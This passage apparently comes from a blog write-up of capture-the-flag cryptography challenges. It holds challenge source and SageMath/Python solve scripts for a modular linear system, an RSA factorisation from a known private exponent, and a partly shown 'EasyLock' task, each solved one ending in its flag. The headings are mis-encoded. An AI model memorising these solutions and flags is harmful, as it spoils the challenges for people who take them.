class="hljs-number">384</span>, <span class="hljs-number">1099</span>, <span class="hljs-number">160</span>, <span class="hljs-number">998</span>, <span class="hljs-number">1311</span>, <span class="hljs-number">1914</span>, <span class="hljs-number">1002</span>, <span class="hljs-number">308</span>, <span class="hljs-number">1399</span>, <span class="hljs-number">1325</span>, <span class="hljs-number">2023</span>, <span class="hljs-number">1357</span>, <span class="hljs-number">23</span>, <span class="hljs-number">740</span>, <span class="hljs-number">223</span>, <span class="hljs-number">1865</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2021</span>, <span class="hljs-number">1144</span>], [<span class="hljs-number">101</span>, <span class="hljs-number">1226</span>, <span class="hljs-number">644</span>, <span class="hljs-number">128</span>, <span class="hljs-number">299</span>, <span class="hljs-number">631</span>, <span class="hljs-number">139</span>, <span class="hljs-number">55</span>, <span class="hljs-number">771</span>, <span class="hljs-number">409</span>, <span class="hljs-number">121</span>, <span class="hljs-number">609</span>, <span class="hljs-number">966</span>, <span class="hljs-number">823</span>, <span class="hljs-number">901</span>, <span class="hljs-number">556</span>, <span class="hljs-number">1396</span>, <span class="hljs-number">981</span>, <span class="hljs-number">365</span>, <span class="hljs-number">339</span>, <span class="hljs-number">1373</span>, <span class="hljs-number">154</span>, <span class="hljs-number">147</span>, <span class="hljs-number">1279</span>, <span class="hljs-number">1886</span>, <span class="hljs-number">1194</span>, <span class="hljs-number">1587</span>, <span class="hljs-number">311</span>, <span class="hljs-number">115</span>, <span class="hljs-number">1909</span>, <span class="hljs-number">1164</span>, <span class="hljs-number">1589</span>, <span class="hljs-number">1699</span>, <span class="hljs-number">1838</span>, <span class="hljs-number">1809</span>, <span class="hljs-number">1191</span>, <span class="hljs-number">536</span>, <span class="hljs-number">1686</span>, <span class="hljs-number">476</span>, <span class="hljs-number">390</span>, <span class="hljs-number">322</span>, <span class="hljs-number">1541</span>], [<span class="hljs-number">874</span>, <span class="hljs-number">903</span>, <span class="hljs-number">917</span>, <span class="hljs-number">1557</span>, <span class="hljs-number">831</span>, <span class="hljs-number">1959</span>, <span class="hljs-number">1773</span>, <span class="hljs-number">930</span>, <span class="hljs-number">1513</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1283</span>, <span class="hljs-number">156</span>, <span class="hljs-number">606</span>, <span class="hljs-number">10</span>, <span class="hljs-number">824</span>, <span class="hljs-number">1903</span>, <span class="hljs-number">1583</span>, <span class="hljs-number">752</span>, <span class="hljs-number">391</span>, <span class="hljs-number">73</span>, <span class="hljs-number">1733</span>, <span class="hljs-number">296</span>, <span class="hljs-number">1958</span>, <span class="hljs-number">1206</span>, <span class="hljs-number">989</span>, <span class="hljs-number">1151</span>, <span class="hljs-number">1123</span>, <span class="hljs-number">103</span>, <span class="hljs-number">1910</span>, <span class="hljs-number">1386</span>, <span class="hljs-number">940</span>, <span class="hljs-number">1522</span>, <span class="hljs-number">1883</span>, <span class="hljs-number">2009</span>, <span class="hljs-number">305</span>, <span class="hljs-number">1258</span>, <span class="hljs-number">134</span>, <span class="hljs-number">353</span>, <span class="hljs-number">49</span>, <span class="hljs-number">91</span>, <span class="hljs-number">1220</span>, <span class="hljs-number">124</span>], [<span class="hljs-number">387</span>, <span class="hljs-number">1884</span>, <span class="hljs-number">286</span>, <span class="hljs-number">1704</span>, <span class="hljs-number">1453</span>, <span class="hljs-number">676</span>, <span class="hljs-number">543</span>, <span class="hljs-number">1445</span>, <span class="hljs-number">1130</span>, <span class="hljs-number">1136</span>, <span class="hljs-number">2010</span>, <span class="hljs-number">1428</span>, <span class="hljs-number">1146</span>, <span class="hljs-number">1190</span>, <span class="hljs-number">1355</span>, <span class="hljs-number">435</span>, <span class="hljs-number">1676</span>, <span class="hljs-number">1209</span>, <span class="hljs-number">139</span>, <span class="hljs-number">1614</span>, <span class="hljs-number">1758</span>, <span class="hljs-number">726</span>, <span class="hljs-number">1139</span>, <span class="hljs-number">1050</span>, <span class="hljs-number">372</span>, <span class="hljs-number">1877</span>, <span class="hljs-number">706</span>, <span class="hljs-number">1634</span>, <span class="hljs-number">881</span>, <span class="hljs-number">1067</span>, <span class="hljs-number">576</span>, <span class="hljs-number">1354</span>, <span class="hljs-number">260</span>, <span class="hljs-number">848</span>, <span class="hljs-number">821</span>, <span class="hljs-number">1390</span>, <span class="hljs-number">1754</span>, <span class="hljs-number">1117</span>, <span class="hljs-number">1449</span>, <span class="hljs-number">1683</span>, <span class="hljs-number">1949</span>, <span class="hljs-number">454</span>], [<span class="hljs-number">441</span>, <span class="hljs-number">1929</span>, <span class="hljs-number">845</span>, <span class="hljs-number">2013</span>, <span class="hljs-number">618</span>, <span class="hljs-number">1070</span>, <span class="hljs-number">808</span>, <span class="hljs-number">836</span>, <span class="hljs-number">966</span>, <span class="hljs-number">401</span>, <span class="hljs-number">1437</span>, <span class="hljs-number">1209</span>, <span class="hljs-number">387</span>, <span class="hljs-number">1093</span>, <span class="hljs-number">1339</span>, <span class="hljs-number">1748</span>, <span class="hljs-number">190</span>, <span class="hljs-number">1947</span>, <span class="hljs-number">954</span>, <span class="hljs-number">1232</span>, <span class="hljs-number">1210</span>, <span class="hljs-number">1525</span>, <span class="hljs-number">724</span>, <span class="hljs-number">55</span>, <span class="hljs-number">980</span>, <span class="hljs-number">1943</span>, <span class="hljs-number">1107</span>, <span class="hljs-number">1053</span>, <span class="hljs-number">1791</span>, <span class="hljs-number">1514</span>, <span class="hljs-number">306</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1344</span>, <span class="hljs-number">264</span>, <span class="hljs-number">140</span>, <span class="hljs-number">838</span>, <span class="hljs-number">802</span>, <span class="hljs-number">424</span>, <span class="hljs-number">1540</span>, <span class="hljs-number">1747</span>, <span class="hljs-number">891</span>, <span class="hljs-number">1020</span>], [<span class="hljs-number">1048</span>, <span class="hljs-number">203</span>, <span class="hljs-number">1424</span>, <span class="hljs-number">469</span>, <span class="hljs-number">1786</span>, <span class="hljs-number">591</span>, <span class="hljs-number">1997</span>, <span class="hljs-number">1687</span>, <span class="hljs-number">539</span>, <span class="hljs-number">253</span>, <span class="hljs-number">278</span>, <span class="hljs-number">717</span>, <span class="hljs-number">1347</span>, <span class="hljs-number">1804</span>, <span class="hljs-number">279</span>, <span class="hljs-number">806</span>, <span class="hljs-number">912</span>, <span class="hljs-number">1837</span>, <span class="hljs-number">1566</span>, <span class="hljs-number">1135</span>, <span class="hljs-number">486</span>, <span class="hljs-number">1648</span>, <span class="hljs-number">1341</span>, <span class="hljs-number">1008</span>, <span class="hljs-number">637</span>, <span class="hljs-number">1699</span>, <span class="hljs-number">1396</span>, <span class="hljs-number">336</span>, <span class="hljs-number">1689</span>, <span class="hljs-number">330</span>, <span class="hljs-number">1033</span>, <span class="hljs-number">128</span>, <span class="hljs-number">1161</span>, <span class="hljs-number">1647</span>, <span class="hljs-number">669</span>, <span class="hljs-number">1788</span>, <span class="hljs-number">1711</span>, <span class="hljs-number">1980</span>, <span class="hljs-number">1882</span>, <span class="hljs-number">259</span>, <span class="hljs-number">138</span>, <span class="hljs-number">1467</span>], [<span class="hljs-number">861</span>, <span class="hljs-number">228</span>, <span class="hljs-number">1485</span>, <span class="hljs-number">1832</span>, <span class="hljs-number">1658</span>, <span class="hljs-number">262</span>, <span class="hljs-number">1207</span>, <span class="hljs-number">719</span>, <span class="hljs-number">1982</span>, <span class="hljs-number">1108</span>, <span class="hljs-number">236</span>, <span class="hljs-number">92</span>, <span class="hljs-number">1894</span>, <span class="hljs-number">669</span>, <span class="hljs-number">437</span>, <span class="hljs-number">1976</span>, <span class="hljs-number">344</span>, <span class="hljs-number">2009</span>, <span class="hljs-number">1697</span>, <span class="hljs-number">874</span>, <span class="hljs-number">1486</span>, <span class="hljs-number">190</span>, <span class="hljs-number">1252</span>, <span class="hljs-number">1018</span>, <span class="hljs-number">561</span>, <span class="hljs-number">375</span>, <span class="hljs-number">1908</span>, <span class="hljs-number">45</span>, <span class="hljs-number">1934</span>, <span class="hljs-number">608</span>, <span class="hljs-number">1615</span>, <span class="hljs-number">658</span>, <span class="hljs-number">1234</span>, <span class="hljs-number">457</span>, <span class="hljs-number">409</span>, <span class="hljs-number">26</span>, <span class="hljs-number">1388</span>, <span class="hljs-number">1959</span>, <span class="hljs-number">1126</span>, <span class="hljs-number">656</span>, <span class="hljs-number">193</span>, <span class="hljs-number">507</span>], [<span class="hljs-number">1324</span>, <span class="hljs-number">508</span>, <span class="hljs-number">1862</span>, <span class="hljs-number">1516</span>, <span class="hljs-number">693</span>, <span class="hljs-number">1819</span>, <span class="hljs-number">1583</span>, <span class="hljs-number">1472</span>, <span class="hljs-number">671</span>, <span class="hljs-number">1295</span>, <span class="hljs-number">1526</span>, <span class="hljs-number">1094</span>, <span class="hljs-number">518</span>, <span class="hljs-number">1189</span>, <span class="hljs-number">1583</span>, <span class="hljs-number">1345</span>, <span class="hljs-number">1054</span>, <span class="hljs-number">1788</span>, <span class="hljs-number">661</span>, <span class="hljs-number">960</span>, <span class="hljs-number">975</span>, <span class="hljs-number">927</span>, <span class="hljs-number">423</span>, <span class="hljs-number">380</span>, <span class="hljs-number">791</span>, <span class="hljs-number">1282</span>, <span class="hljs-number">1239</span>, <span class="hljs-number">756</span>, <span class="hljs-number">199</span>, <span class="hljs-number">1686</span>, <span class="hljs-number">745</span>, <span class="hljs-number">754</span>, <span class="hljs-number">1417</span>, <span class="hljs-number">1347</span>, <span class="hljs-number">1581</span>, <span class="hljs-number">626</span>, <span class="hljs-number">1772</span>, <span class="hljs-number">1465</span>, <span class="hljs-number">1985</span>, <span class="hljs-number">968</span>, <span class="hljs-number">1728</span>, <span class="hljs-number">1641</span>], [<span class="hljs-number">1280</span>, <span class="hljs-number">392</span>, <span class="hljs-number">1695</span>, <span class="hljs-number">882</span>, <span class="hljs-number">1225</span>, <span class="hljs-number">1766</span>, <span class="hljs-number">683</span>, <span class="hljs-number">633</span>, <span class="hljs-number">1065</span>, <span class="hljs-number">1605</span>, <span class="hljs-number">1086</span>, <span class="hljs-number">500</span>, <span class="hljs-number">23</span>, <span class="hljs-number">1836</span>, <span class="hljs-number">583</span>, <span class="hljs-number">589</span>, <span class="hljs-number">1075</span>, <span class="hljs-number">810</span>, <span class="hljs-number">652</span>, <span class="hljs-number">1105</span>, <span class="hljs-number">511</span>, <span class="hljs-number">1756</span>, <span class="hljs-number">20</span>, <span class="hljs-number">756</span>, <span class="hljs-number">988</span>, <span class="hljs-number">1175</span>, <span class="hljs-number">134</span>, <span class="hljs-number">630</span>, <span class="hljs-number">320</span>, <span class="hljs-number">343</span>, <span class="hljs-number">213</span>, <span class="hljs-number">1885</span>, <span class="hljs-number">550</span>, <span class="hljs-number">146</span>, <span class="hljs-number">1121</span>, <span class="hljs-number">1650</span>, <span class="hljs-number">1101</span>, <span class="hljs-number">895</span>, <span class="hljs-number">294</span>, <span class="hljs-number">1710</span>, <span class="hljs-number">1995</span>, <span class="hljs-number">1022</span>], [<span class="hljs-number">340</span>, <span class="hljs-number">1498</span>, <span class="hljs-number">491</span>, <span class="hljs-number">1964</span>, <span class="hljs-number">993</span>, <span class="hljs-number">1479</span>, <span class="hljs-number">1752</span>, <span class="hljs-number">263</span>, <span class="hljs-number">1156</span>, <span class="hljs-number">493</span>, <span class="hljs-number">1812</span>, <span class="hljs-number">1892</span>, <span class="hljs-number">595</span>, <span class="hljs-number">1919</span>, <span class="hljs-number">897</span>, <span class="hljs-number">1520</span>, <span class="hljs-number">1503</span>, <span class="hljs-number">1102</span>, <span class="hljs-number">809</span>, <span class="hljs-number">1374</span>, <span class="hljs-number">1693</span>, <span class="hljs-number">538</span>, <span class="hljs-number">1310</span>, <span class="hljs-number">372</span>, <span class="hljs-number">543</span>, <span class="hljs-number">245</span>, <span class="hljs-number">1912</span>, <span class="hljs-number">1193</span>, <span class="hljs-number">356</span>, <span class="hljs-number">14</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1336</span>, <span class="hljs-number">821</span>, <span class="hljs-number">1111</span>, <span class="hljs-number">1678</span>, <span class="hljs-number">163</span>, <span class="hljs-number">298</span>, <span class="hljs-number">410</span>, <span class="hljs-number">740</span>, <span class="hljs-number">1039</span>, <span class="hljs-number">258</span>, <span class="hljs-number">1256</span>], [<span class="hljs-number">542</span>, <span class="hljs-number">1181</span>, <span class="hljs-number">1683</span>, <span class="hljs-number">1782</span>, <span class="hljs-number">1355</span>, <span class="hljs-number">1598</span>, <span class="hljs-number">853</span>, <span class="hljs-number">1372</span>, <span class="hljs-number">1016</span>, <span class="hljs-number">1416</span>, <span class="hljs-number">466</span>, <span class="hljs-number">502</span>, <span class="hljs-number">528</span>, <span class="hljs-number">1428</span>, <span class="hljs-number">1742</span>, <span class="hljs-number">1748</span>, <span class="hljs-number">963</span>, <span class="hljs-number">1967</span>, <span class="hljs-number">844</span>, <span class="hljs-number">596</span>, <span class="hljs-number">996</span>, <span class="hljs-number">37</span>, <span class="hljs-number">201</span>, <span class="hljs-number">525</span>, <span class="hljs-number">147</span>, <span class="hljs-number">1576</span>, <span class="hljs-number">741</span>, <span class="hljs-number">532</span>, <span class="hljs-number">583</span>, <span class="hljs-number">192</span>, <span class="hljs-number">535</span>, <span class="hljs-number">762</span>, <span class="hljs-number">521</span>, <span class="hljs-number">198</span>, <span class="hljs-number">1204</span>, <span class="hljs-number">1460</span>, <span class="hljs-number">1848</span>, <span class="hljs-number">494</span>, <span class="hljs-number">1704</span>, <span class="hljs-number">43</span>, <span class="hljs-number">1437</span>, <span class="hljs-number">1946</span>], [<span class="hljs-number">1308</span>, <span class="hljs-number">47</span>, <span class="hljs-number">975</span>, <span class="hljs-number">1577</span>, <span class="hljs-number">762</span>, <span class="hljs-number">1978</span>, <span class="hljs-number">0</span>, <span class="hljs-number">562</span>, <span class="hljs-number">1373</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1046</span>, <span class="hljs-number">229</span>, <span class="hljs-number">542</span>, <span class="hljs-number">695</span>, <span class="hljs-number">582</span>, <span class="hljs-number">1455</span>, <span class="hljs-number">360</span>, <span class="hljs-number">245</span>, <span class="hljs-number">1343</span>, <span class="hljs-number">458</span>, <span class="hljs-number">1365</span>, <span class="hljs-number">1859</span>, <span class="hljs-number">1722</span>, <span class="hljs-number">1967</span>, <span class="hljs-number">19</span>, <span class="hljs-number">447</span>, <span class="hljs-number">1545</span>, <span class="hljs-number">1190</span>, <span class="hljs-number">1278</span>, <span class="hljs-number">675</span>, <span class="hljs-number">1992</span>, <span class="hljs-number">1769</span>, <span class="hljs-number">1435</span>, <span class="hljs-number">358</span>, <span class="hljs-number">10</span>, <span class="hljs-number">796</span>, <span class="hljs-number">155</span>, <span class="hljs-number">1000</span>, <span class="hljs-number">1615</span>, <span class="hljs-number">927</span>, <span class="hljs-number">1789</span>, <span class="hljs-number">823</span>]]<br>c = [<span class="hljs-number">644</span>, <span class="hljs-number">915</span>, <span class="hljs-number">892</span>, <span class="hljs-number">1015</span>, <span class="hljs-number">1876</span>, <span class="hljs-number">1611</span>, <span class="hljs-number">925</span>, <span class="hljs-number">334</span>, <span class="hljs-number">36</span>, <span class="hljs-number">41</span>, <span class="hljs-number">629</span>, <span class="hljs-number">1829</span>, <span class="hljs-number">1939</span>, <span class="hljs-number">1681</span>, <span class="hljs-number">224</span>, <span class="hljs-number">646</span>, <span class="hljs-number">502</span>, <span class="hljs-number">1284</span>, <span class="hljs-number">663</span>, <span class="hljs-number">1592</span>, <span class="hljs-number">1890</span>, <span class="hljs-number">1097</span>, <span class="hljs-number">1499</span>, <span class="hljs-number">1927</span>, <span class="hljs-number">30</span>, <span class="hljs-number">1202</span>, <span class="hljs-number">2012</span>, <span class="hljs-number">985</span>, <span class="hljs-number">1393</span>, <span class="hljs-number">106</span>, <span class="hljs-number">1220</span>, <span class="hljs-number">1687</span>, <span class="hljs-number">1712</span>, <span class="hljs-number">1077</span>, <span class="hljs-number">1957</span>, <span class="hljs-number">1418</span>, <span class="hljs-number">555</span>, <span class="hljs-number">514</span>, <span class="hljs-number">1552</span>, <span class="hljs-number">968</span>, <span class="hljs-number">1645</span>, <span class="hljs-number">1850</span>, <span class="hljs-number">919</span>, <span class="hljs-number">587</span>, <span class="hljs-number">463</span>, <span class="hljs-number">963</span>, <span class="hljs-number">1503</span>, <span class="hljs-number">1251</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1251</span>, <span class="hljs-number">1711</span>, <span class="hljs-number">114</span>, <span class="hljs-number">190</span>, <span class="hljs-number">1891</span>, <span class="hljs-number">740</span>, <span class="hljs-number">1358</span>, <span class="hljs-number">1698</span>, <span class="hljs-number">295</span>, <span class="hljs-number">1313</span>, <span class="hljs-number">1812</span>, <span class="hljs-number">1067</span>, <span class="hljs-number">455</span>, <span class="hljs-number">1622</span>, <span class="hljs-number">541</span>, <span class="hljs-number">155</span>, <span class="hljs-number">1083</span>]<br><br>key = matrix(Zmod(P), key)<br>c = vector(Zmod(P), c)<br>m = key \ c<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(m.<span class="hljs-built_in">list</span>()))<br><br><span class="hljs-comment"># flag&#123;0e3ceb92-ef28-48ff-8a1f-556ea8e96263&#125;</span><br></code></pre></td></tr></table></figure><h3 id="4-Euler"><a href="#4-Euler" class="headerlink" title="4. Euler"></a>4. Euler</h3><h4 id="é¢˜ç›®è¯´æ˜-3"><a href="#é¢˜ç›®è¯´æ˜-3" class="headerlink" title="é¢˜ç›®è¯´æ˜"></a>é¢˜ç›®è¯´æ˜</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><br><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>e = <span class="hljs-number">65537</span><br>d = inverse(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>n1 = p*q<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;d =&#x27;</span>, d)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n1 =&#x27;</span>, n1)<br><br><br>n2 = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    tmp = getPrime(<span class="hljs-number">20</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)):<br>        n2 *= tmp<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(n2).bit_length() &gt; <span class="hljs-number">4096</span>:<br>        <span class="hljs-keyword">break</span><br>m = bytes_to_long(flag)<br>e = p<br>c = <span class="hljs-built_in">pow</span>(m,p,n2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n2 = <span class="hljs-subst">&#123;n2&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c = <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">d = 1191103734504058491421349604548564929848616842152689496895544381837156883533438743584190765148552934760581271144506002162145850044043706855922892271482076871873995241085136144968243140990856473896170280564822732549232192446031619309897442553542363254504471740017966570662964696395047018142115398837264339359703632345253800336497946214283448557066829445107164480953216959246058743836325220516737638124436265379246043689904351250933647836622874758885644860021461954464385862680106712884194095768373281466098064819110033091294767089010003022970009602841916377292236136049332199074587736162893766795170383769105855396481</span><br><span class="hljs-string">n1 = 13580613334758608446812976519363134969987613428002924766535019511562587104406919787452524386837284913953412450765046949147625708826808005604839699164252065405707381022094044455947068672776228380259796742758661695038105462132145830673755861626914728707456430832560451486001864528121467715375751025330165798298234749333641286199156268444951660172758198564829589895780644285230824166251980165312273600373379395893191960302458674257328572576250700441136204817923980559222287090491322038600230306017349810608247758292597409739448697047571469597942133677889648017239246044193456551115423543297398389835141582226233401091651</span><br><span class="hljs-string">n2 = 1214806402018035399640161601350276689119300500885922730338627878893519991129980125476434307328318616551645952775278810103829168554249376991124646974529506458637833256309925386195767085673143119319959502919427611337245914269082657148902705137556296048781578971739222821624583120801659535369927877985173236243714461317935517361255270715241189816284530991305321818355420570545833978683123138276923580243415962479127687019106264574314649544746346086459905012212977958967691480715239783822121874583716717022133331534258680100103894980839994381411182849477289831563331555051111524494710894174250831042393260657010039224282544484051247017811298503920278914985702602401902771910416165113998593372720867385848641975504106450347785422029536444684536992419844582901814455572310411304170053743720539065216022165732393062765647406642461667856590659949987014165020908912248704605394194332522772838334355686250772722614893659631917281850223784937395431499960460631775969046704990152101465734651932493302101064276553602695086721483441047849063689763309160624353722539937307711289340553305706186969043326282042780389837191270199164643251358171042535614702470861637110776902483824241373428279843481575953477705679020507998934443944753893015492521729164439</span><br><span class="hljs-string">c = 829714996515560908603942343505920996556339059436557287421074174277687809974667533248085244071086827486112801279665776466949992570288124598686592774771062800764512333540404127622921352174419248968970404794754685847236748961563984628001223295272803310968932487079932521884266677193760840062257399310444131681778575116034804962240312440452076927109544707668525304555494031530153484385014733733295665648179563341929829366393842180933029552234342383165468329118358481709562138556464490952636983157762226775051069620144327191146321078089031134997806488306619954921967209307290224398561337468466377749200533482249418692505335754212596152956893594720809675348504752525191974229476876972508737538861376367290460994163758533707257433535992369795872961693633915923559165304176024241693969803856234404053572424185908635089962296448104233424369921110004610276316317120909034370571217382030431552784144041430129071509829206755292634358474170376986660230213480604735611696589811824530116203051420922042313844629631979060959674508082246111229472102010511440894011705450255517464228219748967389876595425302704439665665510611452129328353818804395006155136491014104673084625985358676817967767734690717397046423097222254342558118886724303282396865112622135</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="è§£é¢˜æ€è·¯-3"><a href="#è§£é¢˜æ€è·¯-3" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">e= <span class="hljs-number">65537</span><br>d = <span class="hljs-number">1191103734504058491421349604548564929848616842152689496895544381837156883533438743584190765148552934760581271144506002162145850044043706855922892271482076871873995241085136144968243140990856473896170280564822732549232192446031619309897442553542363254504471740017966570662964696395047018142115398837264339359703632345253800336497946214283448557066829445107164480953216959246058743836325220516737638124436265379246043689904351250933647836622874758885644860021461954464385862680106712884194095768373281466098064819110033091294767089010003022970009602841916377292236136049332199074587736162893766795170383769105855396481</span><br>n1 = <span class="hljs-number">13580613334758608446812976519363134969987613428002924766535019511562587104406919787452524386837284913953412450765046949147625708826808005604839699164252065405707381022094044455947068672776228380259796742758661695038105462132145830673755861626914728707456430832560451486001864528121467715375751025330165798298234749333641286199156268444951660172758198564829589895780644285230824166251980165312273600373379395893191960302458674257328572576250700441136204817923980559222287090491322038600230306017349810608247758292597409739448697047571469597942133677889648017239246044193456551115423543297398389835141582226233401091651</span><br>n2 = <span class="hljs-number">1214806402018035399640161601350276689119300500885922730338627878893519991129980125476434307328318616551645952775278810103829168554249376991124646974529506458637833256309925386195767085673143119319959502919427611337245914269082657148902705137556296048781578971739222821624583120801659535369927877985173236243714461317935517361255270715241189816284530991305321818355420570545833978683123138276923580243415962479127687019106264574314649544746346086459905012212977958967691480715239783822121874583716717022133331534258680100103894980839994381411182849477289831563331555051111524494710894174250831042393260657010039224282544484051247017811298503920278914985702602401902771910416165113998593372720867385848641975504106450347785422029536444684536992419844582901814455572310411304170053743720539065216022165732393062765647406642461667856590659949987014165020908912248704605394194332522772838334355686250772722614893659631917281850223784937395431499960460631775969046704990152101465734651932493302101064276553602695086721483441047849063689763309160624353722539937307711289340553305706186969043326282042780389837191270199164643251358171042535614702470861637110776902483824241373428279843481575953477705679020507998934443944753893015492521729164439</span><br>c = <span class="hljs-number">829714996515560908603942343505920996556339059436557287421074174277687809974667533248085244071086827486112801279665776466949992570288124598686592774771062800764512333540404127622921352174419248968970404794754685847236748961563984628001223295272803310968932487079932521884266677193760840062257399310444131681778575116034804962240312440452076927109544707668525304555494031530153484385014733733295665648179563341929829366393842180933029552234342383165468329118358481709562138556464490952636983157762226775051069620144327191146321078089031134997806488306619954921967209307290224398561337468466377749200533482249418692505335754212596152956893594720809675348504752525191974229476876972508737538861376367290460994163758533707257433535992369795872961693633915923559165304176024241693969803856234404053572424185908635089962296448104233424369921110004610276316317120909034370571217382030431552784144041430129071509829206755292634358474170376986660230213480604735611696589811824530116203051420922042313844629631979060959674508082246111229472102010511440894011705450255517464228219748967389876595425302704439665665510611452129328353818804395006155136491014104673084625985358676817967767734690717397046423097222254342558118886724303282396865112622135</span><br><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getpq</span>(<span class="hljs-params">n,e,d</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        k = e * d - <span class="hljs-number">1</span><br>        g = random.randint(<span class="hljs-number">0</span>, n)<br>        <span class="hljs-keyword">while</span> k%<span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>            k = k // <span class="hljs-number">2</span><br>            temp = <span class="hljs-built_in">pow</span>(g,k,n)-<span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> GCD(temp,n)&gt;<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> temp!=<span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">return</span> GCD(temp,n)<br>p = getpq(n1, e, d)<br>q = n1 // p<br>phi = euler_phi(n2)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c, inverse_mod(p, phi), n2)))<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c, inverse_mod(q, phi), n2)))<br><br><span class="hljs-comment"># flag&#123;09d9cf63-4ccc-4615-8a40-577e1152d2b3&#125;</span><br></code></pre></td></tr></table></figure><h3 id="5-EasyLock"><a href="#5-EasyLock" class="headerlink" title="5. EasyLock"></a>5. EasyLock</h3><h4 id="é¢˜ç›®è¯´æ˜-4"><a href="#é¢˜ç›®è¯´æ˜-4" class="headerlink" title="é¢˜ç›®è¯´æ˜"></a>é¢˜ç›®è¯´æ˜</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>m = bytes_to_long(flag)<br><span class="hljs-keyword">assert</span> m.bit_length() == <span class="hljs-number">47</span><br>data = [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>]<br>cs = []<br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p*q<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>    cs.append(<span class="hljs-built_in">pow</span>(i, m, n))<br><span class="hljs-built_in">print</span>(cs)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[183098212086317720236828757315510192339273033804875740822801041376722387458993552796227899411901966324318366514880536763913315608412750265815750386810801443666072579873995967676472994916617708760086271155827496223499121301339946900578686321571238854410077055150282805741312173826325669295346629270100887114, 57033027040944100515577298747833062983449034346155581535109171399667991971614122726451624246276583123688811765412755210627513537740891720491136798691017567675611749056264437247135506921747135448387155606513983563110678466501221603978172670533058510913876368172674768929417846635764813733749021238273031358064, 44177513422937659688192503808032734159830361147993789424022745838993946766432456884886189398779755202878679629523667923807343226973440318127947558457476925179848208108399587026072741947465486816791306581859876197942191253278120326733144030253277598039138046967591357892542649422324554104602547660747339872074, 